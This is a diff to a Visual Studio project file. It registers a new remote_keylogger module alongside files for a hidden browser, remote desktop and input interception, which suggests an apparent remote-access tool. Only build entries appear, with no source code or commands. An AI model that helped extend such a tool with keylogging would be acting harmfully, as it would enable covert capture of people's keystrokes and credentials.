@@ -149,6 +149,7 @@
     <ClInclude Include="remote_log.h" />
     <ClInclude Include="remote_desktop.h" />
     <ClInclude Include="remote_hidden_browser.h" />
+    <ClInclude Include="remote_keylogger.h" />
     <ClInclude Include="remote_input_interception.h" />
     <ClInclude Include="interception\interception.h" />
     <ClInclude Include="gdiplus_jpeg.h" />
@@ -181,6 +182,9 @@
       <PrecompiledHeader>NotUsing</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="interception\interception_api.c">
+      <PrecompiledHeader>NotUsing</PrecompiledHeader>
+    </ClCompile>
+    <ClCompile Include="remote_keylogger.c">
       <PrecompiledHeader>NotUsing</PrecompiledHeader>
     </ClCompile>
     <ClCompile Include="remote_input_interception.c">
